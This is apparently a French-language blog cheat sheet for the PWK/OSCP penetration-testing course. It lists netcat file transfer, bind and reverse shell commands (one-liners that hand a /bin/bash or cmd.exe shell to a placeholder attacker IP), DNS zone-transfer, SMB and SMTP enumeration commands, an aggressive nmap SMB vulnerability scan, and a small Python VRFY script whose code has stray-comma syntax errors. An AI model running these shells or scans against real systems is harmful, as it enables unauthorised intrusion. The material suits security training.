---
layout: post
title: Cheatsheet - PWK Essentials
subtitle: Résumé PWK - OSCP 
gh-repo: 0xSs0rZ/0xSs0rZ.github.io
gh-badge: [star]
tags: [Cheat sheet, PWK, OSCP, Netcat, Find, Locate, Which, SSH, Apache, Ncat, Transfert fichier, Bind shell, Reverse shell, theharvester, DNS, DNS enumeration, DNS zone transfer, DNSRecon, SMB, SMB enumeration, nbtscan, enum4linux, SMTP enumeration, SMTP, Python, socket, Nmap,  Commandes, Linux, Windows]
comments: false
---

**Résumé du PWK - OSCP**

# Locate

~~~
root@Host-001:~# locate rockyou.txt
/root/Bureau/SecLists/Passwords/Leaked-Databases/rockyou.txt.tar.gz
/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz
/usr/share/wordlists/rockyou.txt
~~~

# Which 

~~~
root@Host-001:~# which python
/usr/bin/python
~~~

# Find 

~~~
root@Host-001:~# find /root -name mimikatz.exe
/root/Bureau/mimikatz.exe
~~~

# SSH

Lancer le service: service ssh start
Verifier que le service est en cours: netstat -antp | grep sshd
Forcer le lancement du service lors du démarrage: update-rc.d ssh enable

# Apache

Lancer le service: service apache2 start
Verifier que le service est en cours: netstat -antp | grep apache
Forcer le lancement du service lors du démarrage: update-rc.d apache2 enable

# Bash

# Netcat

1. Transfert de fichier

Machine réceptrice:

~~~
nc -nlvp PORT ­> file
~~~

Machine émettrice:

~~~
nc -nv IP PORT < file_to_send
~~~

2. Bind shell

Machine cible:

~~~
// Windows
nc -nlvp PORT -e cmd.exe
// Linux
nc -nlvp PORT -e /bin/bash
~~~

Attaquant:

~~~
nc -nv IP_CIBLE PORT
~~~

3. Reverse shell

Attaquant:

~~~
nc -nlvp PORT
~~~

Cible:

~~~
nc -nv IP_ATTAQUANT PORT -e /bin/bash
~~~

# theharvester

theharvester est un outil pour trouver des email durant la phase de reconnaissance

~~~
root@kali:~# theharvester -d cisco.com -b google >google.txt
~~~

# DNS server enumeration

~~~
host -t ns domainname.com
~~~

# Mail server enumeration

~~~
host -t mx domainename.com
~~~

# DNS zone transfert

~~~
//host -l <domain name> <dns server address>
host -l domainname.com ns1.domainname.com

//Avec Nmap
nmap --script=dns-zone-tranfer -p 53 ns1.domainename.com
~~~

# DNSRecon

~~~
dnsrecon -d domainname.com -t axfr
~~~

# Nmap

~~~
//Pour trouver les hotes d'un réseau en complément de netdiscover
nmap -v -sn IP_DEBUT-IP_FIN
~~~

-oG : pour enregistrer dans un fichier 'grep'able
-O : version de l'OS

~~~
//HTB Style
nmap -sC -sV IP
~~~

~~~
//Scan SMB - ports SMB NetBIOS 139 et 445
nmap -v -p 139,445 IP_DEBUT-IP FIN
~~~

~~~
// Script pour détecter l'OS
nmap IP --script smb-os-discovery.nse
~~~

# SMB enumeration

~~~
//nbtscan
nbtscan -r 192.168.1.0/24

//enum4linux
enum4linux -a IP

//scripts nmap
ls -la /usr/share/nmap/scripts/smb*

//check for known SMB protocol vulnerabilities
nmap -v -p 139,445 --script=smb-check-vulns --script-args=unsafe=1 IP
~~~

# SMTP Enumeration

~~~
//Port ouvert ?
nc -nv IP 25
// si ouvert verifier si bob exist
VRFY bob
~~~

Script vrfy.py:

~~~
#!/usr/bin/python
import socket
import sys
if len(sys.argv) != 2:,
	print "Usage: vrfy.py <username>",
	sys.exit(0)
	
# Create a Socket 
s=socket.socket(socket.AF_INET,,socket.SOCK_STREAM),

# Connect to the Server
connect=s.connect(('192.168.11.215',25))

# Receive the banner
banner=s.recv(1024)
print banner 

# VRFY a user
s.send('VRFY ' + sys.argv[1] + '\r\n')
result=s.recv(1024)
print result

# Close the socket
s.close()
~~~

[![CC-BY](https://mirrors.creativecommons.org/presskit/buttons/88x31/svg/by.svg)](https://creativecommons.org/licenses/by/4.0/)

This work is licensed under a [Creative Commons Attribution 4.0 International License](https://creativecommons.org/licenses/by/4.0/).
